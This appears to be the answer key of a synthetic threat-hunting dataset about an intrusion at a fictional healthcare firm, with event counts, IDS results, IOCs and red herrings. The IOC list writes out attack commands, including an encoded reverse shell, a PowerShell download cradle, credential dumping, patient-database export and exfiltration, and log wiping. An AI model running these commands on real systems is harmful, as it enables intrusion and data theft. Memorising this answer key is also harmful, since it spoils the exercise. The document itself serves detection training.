| daf84ad1-8d38-454b-89ea-918954d20c11 | ids | delayed: 1 |
| dc07c698-779c-4153-b098-b0f0bfeb08c6 | ids | delayed: 1 |
| dc440017-d614-4f72-8723-4b105eec863d | ids | delayed: 1 |
| dd932b0e-8f43-4bd4-b169-a51a0e01d8d2 | ids | delayed: 1 |
| e1d3ebaf-b714-4662-acd2-6ab51e03fa5a | ids | delayed: 1 |
| e1dbcdb7-760d-4994-a6ea-c5787b3e6dc7 | ids | delayed: 2 |
| e2ac71c6-d465-42b2-8ca5-54f6aabe4a46 | ids | delayed: 1 |
| e3f59f64-6bca-482b-b7ef-c54f4f7429d9 | ids | delayed: 1 |
| e3fd5675-b3af-4b31-a24f-79b9b91f0ce6 | ids | delayed: 1 |
| e41b6c15-c6d4-486a-98a7-dc3a888031f2 | ids | delayed: 1 |
| e78b456c-80dc-4809-a359-f2effefbaf7a | ids | delayed: 1 |
| e910d6e2-28ce-4bd2-a7ca-5886698a185e | ids | delayed: 1 |
| e935bf33-524a-47d9-9489-df2a30e1f9f0 | ids | delayed: 2 |
| e9ba1437-8d77-4ac9-94a7-52b1d16104dd | ids | delayed: 1 |
| eef77745-d7f9-4d72-b1a0-0d334750ad9d | ids | filtered: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 4, filtered: 4, visible: 2 |
| evt-002 | asa | delayed: 355, filtered: 1, visible: 3 |
| evt-002 | ecar | delayed: 356, dropped: 3 |
| evt-002 | ids | delayed: 14 |
| evt-002 | web | delayed: 321, visible: 1 |
| evt-002 | zeek | delayed: 508, dropped: 1, filtered: 2, visible: 171 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | visible: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | visible: 3 |
| evt-006 | asa | delayed: 31, visible: 1 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 56 |
| evt-006 | syslog | delayed: 4 |
| evt-006 | sysmon | delayed: 11 |
| evt-006 | windows_security | delayed: 7 |
| evt-006 | zeek | delayed: 24, visible: 9 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 4, filtered: 1 |
| evt-008 | ecar | delayed: 8 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 3 |
| evt-008 | zeek | delayed: 8 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 12 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 19, visible: 1 |
| evt-012 | zeek | delayed: 6, visible: 2 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 41 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 15 |
| evt-013 | zeek | delayed: 3, visible: 1 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | dropped: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 24 |
| evt-015 | sysmon | delayed: 22 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 4 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 32 |
| evt-017 | sysmon | delayed: 31 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | visible: 3 |
| evt-018 | asa | delayed: 25, dropped: 1, visible: 1 |
| evt-018 | ecar | delayed: 35 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 19 |
| evt-018 | zeek | delayed: 52, visible: 16 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 4, out_of_window: 2, visible: 2 |
| evt-020 | asa | delayed: 25, filtered: 286 |
| evt-020 | ecar | delayed: 307, dropped: 4 |
| evt-020 | ids | delayed: 6, filtered: 269 |
| evt-020 | sysmon | delayed: 18 |
| evt-020 | windows_security | delayed: 322, visible: 4 |
| evt-020 | zeek | delayed: 473, dropped: 1, filtered: 6, visible: 142 |
| evt-021 | asa | delayed: 89, visible: 2 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 16, filtered: 164, visible: 2 |
| evt-021 | windows_security | delayed: 88, dropped: 1, visible: 2 |
| evt-021 | zeek | delayed: 126, visible: 56 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 11, visible: 1 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 11 |
| evt-023 | ecar | delayed: 38, dropped: 1 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 6, visible: 2 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 7 |
| evt-025 | ecar | delayed: 37 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 29 |
| evt-025 | windows_security | delayed: 10, dropped: 1 |
| evt-025 | zeek | delayed: 16, visible: 2 |
| evt-026 | asa | delayed: 7, filtered: 3 |
| evt-026 | ecar | delayed: 11 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 3 |
| evt-026 | zeek | delayed: 26 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 28 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 6 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 4, visible: 2 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 10 |
| evt-033 | sysmon | delayed: 9 |
| evt-033 | windows_security | delayed: 10 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 1, visible: 1 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | all | out_of_window: 1 |
| evt-email-001 | asa | delayed: 3, filtered: 2 |
| evt-email-001 | ecar | delayed: 8 |
| evt-email-001 | proxy | delayed: 1 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 4 |
| evt-email-001 | windows_security | delayed: 3 |
| evt-email-001 | zeek | delayed: 7, visible: 5 |
| evt-email-002 | asa | delayed: 4 |
| evt-email-002 | ecar | delayed: 5 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 2 |
| evt-email-002 | windows_security | delayed: 3 |
| evt-email-002 | zeek | delayed: 6, visible: 2 |
| evt-email-003 | asa | delayed: 6, filtered: 3 |
| evt-email-003 | ecar | delayed: 23 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 23 |
| evt-email-003 | windows_security | delayed: 15 |
| evt-email-003 | zeek | delayed: 17, visible: 5 |
| evt-email-004 | all | out_of_window: 8 |
| evt-email-004 | asa | delayed: 11, filtered: 3 |
| evt-email-004 | ecar | delayed: 20 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 3 |
| evt-email-004 | windows_security | delayed: 9 |
| evt-email-004 | zeek | delayed: 27, visible: 11 |
| evt-email-005 | asa | delayed: 1 |
| evt-email-005 | ecar | delayed: 1 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | zeek | delayed: 2 |
| evt-email-006 | asa | delayed: 4 |
| evt-email-006 | ecar | delayed: 7 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 6 |
| evt-email-006 | windows_security | delayed: 5 |
| evt-email-006 | zeek | delayed: 9, visible: 2 |
| evt-email-007 | asa | delayed: 7, filtered: 2 |
| evt-email-007 | ecar | delayed: 14 |
| evt-email-007 | proxy | delayed: 1 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 4 |
| evt-email-007 | zeek | delayed: 19, visible: 9 |
| evt-email-008 | asa | delayed: 8, filtered: 4 |
| evt-email-008 | ecar | delayed: 32 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 24 |
| evt-email-008 | windows_security | delayed: 12 |
| evt-email-008 | zeek | delayed: 21, visible: 7 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 2 |
| evt-email-010 | ecar | delayed: 2 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5, visible: 4 |
| evt-email-011 | asa | delayed: 7, filtered: 2 |
| evt-email-011 | ecar | delayed: 13 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 8 |
| evt-email-011 | windows_security | delayed: 9 |
| evt-email-011 | zeek | delayed: 18, visible: 7 |
| f00e1bc8-dc16-498b-bb66-bc44b990ecb2 | ids | delayed: 1 |
| f2d81bc5-3c57-40e8-bce2-e8249c13c084 | ids | delayed: 1 |
| f552a2d4-a7e9-4d51-95af-18577aaa5ac0 | ids | delayed: 1 |
| f70bf509-dd70-40e6-9212-9fa25d21707f | ids | delayed: 1 |
| f8eb97e5-4375-4361-acc6-d89d1a575476 | ids | delayed: 1 |
| f9717d06-d5c9-4d33-8ab7-d0c28974aa84 | ids | delayed: 1 |
| fc037ef0-cc2c-41a9-b02f-9d81d52a53ae | ids | delayed: 1 |
| fc8b86fa-5f55-4851-901a-476ab99e33b4 | ids | delayed: 1 |
| fceb5b4c-0d79-4f79-a9c2-daccfef71c79 | ids | delayed: 1 |
| fd958cde-ce90-4492-a254-44173a310f5a | ids | delayed: 1 |
| fe18aac1-7f2d-4d21-a2b1-c9252d0c8a3e | ids | filtered: 1 |
| ff2baa65-5279-41ab-8d31-5ca35f7dcbf5 | ids | delayed: 2 |
| red_herring:rh-001 | ecar | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 4 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 34 |
| red_herring:rh-002 | sysmon | delayed: 33 |
| red_herring:rh-002 | windows_security | delayed: 8 |
| red_herring:rh-002 | zeek | visible: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 2, visible: 2 |


## IDS Evaluation Summary

Observation totals: delayed=193, filtered=436, visible=4.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 1 | 1 | 0 | built_in=1 | `e479c5024473` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `eefb9e518d67` |
| snort-core | 1:2000560 | 2 | 2 | 0 | built_in=2 | `b5870b8ee03d` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `02f9b994073c` |
| snort-core | 1:2003068 | 1 | 1 | 0 | built_in=1 | `e48a30863c57` |
| snort-core | 1:2016149 | 4 | 4 | 0 | built_in=4 | `457a0130caaa` |
| snort-core | 1:2024291 | 5 | 5 | 0 | built_in=5 | `a1fbae7a06e2` |
| snort-core | 1:2024392 | 2 | 2 | 0 | built_in=2 | `87256dce3ddb` |
| snort-core | 1:2027757 | 8 | 8 | 0 | built_in=8 | `e9845645b270` |
| snort-core | 1:2027863 | 7 | 7 | 0 | built_in=7 | `1344c083bbb7` |
| snort-core | 1:2027865 | 97 | 15 | 82 | authored_attachment=9, built_in=6 | `6e8a173adf20` |
| snort-core | 1:2029706 | 280 | 11 | 269 | authored_attachment=6, built_in=5 | `7ef9ad77cc7d` |
| snort-core | 1:384 | 2 | 2 | 0 | built_in=2 | `bf579032b0e4` |
| snort-perimeter | 1:2000357 | 3 | 3 | 0 | built_in=3 | `f6c8f195bac1` |
| snort-perimeter | 1:2000428 | 7 | 7 | 0 | built_in=7 | `d80aca878ce1` |
| snort-perimeter | 1:2000560 | 3 | 3 | 0 | built_in=3 | `aac9b2e9fe02` |
| snort-perimeter | 1:2000575 | 6 | 6 | 0 | built_in=6 | `c4738394a961` |
| snort-perimeter | 1:2002910 | 16 | 14 | 2 | built_in=14 | `a294b4b7b161` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `e08da05b3704` |
| snort-perimeter | 1:2003068 | 8 | 8 | 0 | built_in=8 | `095c441ecce9` |
| snort-perimeter | 1:2010935 | 3 | 3 | 0 | built_in=3 | `123065fd82b3` |
| snort-perimeter | 1:2013028 | 2 | 2 | 0 | built_in=2 | `a41fec4e53eb` |
| snort-perimeter | 1:2013504 | 2 | 2 | 0 | authored_attachment=1, built_in=1 | `401b099ac3c3` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `e4948c3e942d` |
| snort-perimeter | 1:2016360 | 4 | 4 | 0 | built_in=4 | `81dde69d1a09` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `a669946bc7f9` |
| snort-perimeter | 1:2022476 | 2 | 2 | 0 | built_in=2 | `339f07525ce6` |
| snort-perimeter | 1:2023672 | 4 | 4 | 0 | built_in=4 | `c52a6170f2fe` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `5afb04d303c2` |
| snort-perimeter | 1:2024291 | 4 | 4 | 0 | built_in=4 | `f29a98d9a1df` |
| snort-perimeter | 1:2024392 | 2 | 2 | 0 | built_in=2 | `b59124188d97` |
| snort-perimeter | 1:2024897 | 4 | 4 | 0 | built_in=4 | `a37e0f5b7200` |
| snort-perimeter | 1:2025712 | 2 | 2 | 0 | built_in=2 | `6f9e90dff1b9` |
| snort-perimeter | 1:2025991 | 7 | 7 | 0 | built_in=7 | `83e988365878` |
| snort-perimeter | 1:2027316 | 3 | 3 | 0 | built_in=3 | `2d2265404373` |
| snort-perimeter | 1:2027757 | 6 | 6 | 0 | built_in=6 | `bbd0e4492f1e` |
| snort-perimeter | 1:2027863 | 5 | 5 | 0 | built_in=5 | `c82dc4fe0530` |
| snort-perimeter | 1:2027865 | 94 | 12 | 82 | authored_attachment=9, built_in=3 | `b4639659e320` |
| snort-perimeter | 1:2028401 | 3 | 3 | 0 | built_in=3 | `cf21655c94f3` |
| snort-perimeter | 1:2029706 | 4 | 4 | 0 | built_in=4 | `e9120ba737bd` |
| snort-perimeter | 1:366 | 6 | 6 | 0 | built_in=6 | `aec02c61b365` |
| snort-perimeter | 1:382 | 6 | 6 | 0 | built_in=6 | `d7b47c30d116` |
| snort-perimeter | 1:384 | 6 | 6 | 0 | built_in=6 | `5a950b2a7a21` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.10:443 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C3wm4IaXEQcbIV5iI5
- SMTP Zeek UID: C74fxV5Tl4fQjGyWEA
- SMTP Zeek UID: C9VzP4p4esvGGZztB5a
- SMTP Zeek UID: CC8e7jbkPBTJGzK3I
- SMTP Zeek UID: CCbkLNJMsBhXsD0hBu
- SMTP Zeek UID: CGZ5xKP8fo77nhH3Ok
- SMTP Zeek UID: CJFYSnAP69EF0slE866
- SMTP Zeek UID: CMBMC3FWHnAriynXwj
- SMTP Zeek UID: CMfEiFkpMFMdxHv1U0
- SMTP Zeek UID: CQPSNVDjUQM8LPJ6i
- SMTP Zeek UID: CQQ5O1LEYsf8iMvTAy
- SMTP Zeek UID: CbBu33tKKjU9unmCiz
- SMTP Zeek UID: CgeqeGcIh9AGWzGrdVe
- SMTP Zeek UID: Cl5Aq7oLfQrq5XXw4W
- SMTP Zeek UID: CtfSMcp4t6xYxQDu36
- Zeek UID: C6azvFv5ExMD4e2c7D
- Zeek UID: CBuQqeJgScenYaD3Lk
- Zeek UID: CLF839m5cciI3JxBn
- Zeek UID: CQJQvX4wbbGk42JqRJN
- Zeek UID: CQiJmri7Czb0jtVmo1
- Zeek UID: CRgEwaiGGrwkVK6Se
- Zeek UID: CV9r9AoDPRltI19V64
- Zeek UID: CVhD8ynIpPr5MsHkFL
- Zeek UID: CWlWG0QuDddfVN12DVW
- Zeek UID: CePAvIVxNsogU0cvIAk
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:57 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:59 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:02 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:03 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:59 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:10:20 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:21 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:23 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
